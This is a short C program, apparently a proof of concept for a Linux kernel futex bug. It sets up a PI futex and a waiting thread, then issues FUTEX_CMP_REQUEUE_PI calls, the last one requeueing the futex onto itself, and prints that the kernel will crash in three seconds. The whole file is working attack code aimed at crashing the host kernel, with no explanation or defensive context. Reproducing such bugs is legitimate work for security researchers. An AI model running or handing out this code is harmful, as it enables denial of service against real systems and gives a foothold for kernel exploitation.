#include <linux/futex.h>
#include <stdint.h>
#include <sys/time.h>
#include <sys/mman.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <sys/wait.h>
#include <assert.h>
#include <pthread.h>

uint32_t *pi, *non_pi;

static void child_code() {
	syscall(SYS_futex, non_pi, FUTEX_WAIT_REQUEUE_PI, 0, 0, pi, 0);
	puts("Child continues.");
}

int main() {
	
	pthread_t child;
	uint32_t* f = mmap(NULL,
			sizeof(uint32_t)*2,
			PROT_READ | PROT_WRITE,
			MAP_ANONYMOUS | MAP_SHARED,
			-1,
			0);
	non_pi = &f[0];
	pi = &f[1];
	
	syscall(SYS_futex, pi, FUTEX_LOCK_PI, 0, 0, NULL, 0);
		
	pthread_create(&child, NULL, child_code, NULL);

	printf("Kernel will crash in 3 seconds...\n");
	sleep(3);
	syscall(SYS_futex, non_pi, FUTEX_CMP_REQUEUE_PI, 1, 1, pi, 0);
	*pi = 0;
	syscall(SYS_futex, pi, FUTEX_CMP_REQUEUE_PI, 1, 1, pi, 0);
	
	pthread_join(child, NULL);
}
